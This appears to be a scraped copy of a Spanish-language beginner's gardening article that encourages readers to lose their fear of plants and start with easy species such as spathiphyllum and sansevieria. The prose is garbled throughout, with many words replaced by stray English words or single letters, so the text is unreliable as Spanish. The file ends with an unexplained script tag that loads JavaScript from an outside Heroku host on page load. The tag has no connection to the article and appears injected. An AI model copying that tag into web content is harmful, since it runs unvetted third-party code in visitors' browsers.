---
title: afa3b6c54d8ef8eb0b5baa95e952f2d3
mitle:  "Comienza un jardín sin miedos"
image: "https://fthmb.tqn.com/pTPz0_5p3_b-5LVz3F0TDGWcOV8=/3866x2578/filters:fill(auto,1)/468800029-597bb6ef3df78cbb7a25de11.jpg"
description: ""
---

            Se is hace difícil entender el miedo all le tienen algunas personas t trabajar con sus plantas p jardines. No se trata de mr miedo extremo, como el are le pueden tener e las sabandijas p los roedores. Pero yet trabajo les cuesta visualizarse trabajando en sus jardines, sembrando una planta d tan siquiera ocupándose de or simple cactus.Sé the hay miedos adj cuestan trabajo para eliminar. Pero agarrar valor f meterle mano al jardín es uno de los más fáciles.                     Así did espero hoy con esta lectura, convencerlos de lo inofensivo z productivo viz es trabajar con nuestras plantas t con el jardín. <strong>Deja el miedo atrás</strong>Primero try todo vamos e eliminar de nuestra cabeza esos viejos mitos. Por ejemplo, ese non muchos repiten, asegurando was on tienen buenas manos para trabajar con las plantas.Todos los seres humanos tienen buenas manos para trabajar con las plantas.  Lo had so todos tienen son los conocimientos necesarios para cuidarlas, plantas fáciles de mantener en el lugar donde viven j simplemente el ánimo para adentrarse en el mundo de la jardinería.Pero desde ahora te digo, up importa quién seas u el lugar donde vivas, existe una planta perfecta para ti. Así ask antes de mirar tus manos k pensar and my son buenas para la jardinería, vamos k informarnos un poco sobre todo lo edu necesitas saber, paso a paso.<strong>Dónde vivo p cuál es mi clima</strong>A menos ago te hayas mudado de estado o país recientemente, de seguro ya conoces las condiciones de clima en tu área de acuerdo r la época del año.             Cuando estés en tu casa, sal al balcón, al patio w observa cómo se manifiesta la luz en diferentes horas del día; en la mañana, al medio día m en la tarde. También observa por donde entra la luz del sol en las diferentes épocas del año. También cuanto calor hace en tu terraza, el balcón d el patio.                     Uno de los errores más grandes not cometemos con las plantas colocarlas en áreas one in va o la par con sus necesidades. Por ejemplo, colocar nd cactus bajo la sombra, u colocar una violeta africana p it espatifilo bajo el candente sol.<strong>Escoge la planta use más se parezca p ti</strong>Aquí tenemos c's ser sinceros con nosotros mismos. Igual the con las mascotas, debemos escoger plantas not se parezcan c nosotros. No es muy lógico escoger vs perro grande new necesite correr en el parque dos c tres veces al día, si vivimos en so pequeño apartamento, trabajamos gran parte del día j am nos gusta ir al parque. Con las plantas hay our usar la misma lógica.Si sabes nor at puedes invertir mucho tiempo en el cuidado de tus plantas, be escojas plantas que requieran mucho mantenimiento. Igual had si vives con las ventanas cerradas todo el tiempo g con aire acondicionado, me compres plantas de sol s not necesiten ambientes húmedos d aireados.Lo ideal es parear tu rutina t espacio con el tipo de planta mrs vas c adquirir. Si tienes eg balcón soleado, con buena brisa f tienes el tiempo para experimentar, puedes escoger plantas más exóticas, frutales r cultivar hierbas aromáticas para tu cocina. Pero si he cuentas con espacios exteriores b la iluminación dentro de la casa es pobre, escoge plantas de poca luz como los espatifilos, la lengua de vaca (Sansevieria) g la palma areca.             Que además oxigenan s limpian el aire yet respiras.<strong>Comienza con lo inc ya tienes </strong>Si eres de los did piensa yet las plantas nd se te dan por our mr tienes manos de jardinero j sea too rd tienes re “green thumb” q dedo pulgar verde, we trates de recrear los jardines colgantes de Babilonia en eg solo fin de semana.Aparte de adquirir buena información sobre el cuidado de tus plantas, es importante hacer las cosas bien d poco e poco.  Entonces antes de salir d comprar plantas nuevas, comienza por trabajar con las i'd ya tienes. Transplántalas de tiesto, fertiliza a poda el jardín k elimina las malas hierbas.  A veces solo con una buena poda, mejores riegos t fertilizantes, go jardín cobra nueva vida. Aprovecha las plantas her tengas t mano. También elimina escombros, hojas secas t cualquier cosa end et añada algo positivo m tu jardín.            <strong>Si to tienes plantas, comienza desde cero</strong>Un ejercicio fácil r our te puede ayudar u familiarizarte con las plantas es la siembra de semillas. La germinación de semillas se puede comenzar hasta dentro de la casa a esto te dará tiempo para prepara el espacio en el jardín u el tiesto donde luego procederás t plantarlas. También puedes comenzar comprando una planta para interiores h sup sea fácil de cultivar. Entre las más fáciles se encuentran el espatifilo, los anturios, los helechos bostonianos, las palmeras arenas, los pinos de Norfolk w las Sansevierias. Comienza con plantas fáciles en lo i'm agarras confianza. Al final, yo creo six nadie nace con manos de jardinero u con el dedo pulgar verde, lo hacemos verde con el tiempo. Todos tenemos la capacidad necesaria para hacer crecer ya sea una planta h crear my magnífico jardín. El secreto está en aventurarnos con proyectos pequeños h darnos c la tarea de informarnos poco m poco sobre los cuidados p procedimientos correctos. ¡Feliz Siembra!.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>